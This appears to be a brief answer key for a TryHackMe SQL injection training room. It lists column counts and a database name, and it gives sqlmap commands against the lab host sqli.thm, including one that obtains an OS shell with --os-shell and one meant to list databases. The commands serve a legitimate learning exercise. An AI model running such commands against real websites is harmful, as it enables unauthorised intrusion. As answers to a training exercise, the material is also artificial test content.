# TryHackMe SQL Injection

> Saikat Karmakar | AUG 18 : 2021

---

## Task 7

1. How many columns are being returned by the query?
```
5
```
2. How many of these columns can accept strings? ('a')
```
5 
```
3. What's the database name?
```
sqlitraining
```

## Task 8

1.  How would you get an OS shell on website "sqli.thm/login.php"? (URL switch comes first)
```
sqlmap -u "sqli.thm/login.php" --os-shell
```
2. What about listing all databases on the same website? (URL switch comes first)
```
sqlmap -u "sqli.thm/login.php" --db
```

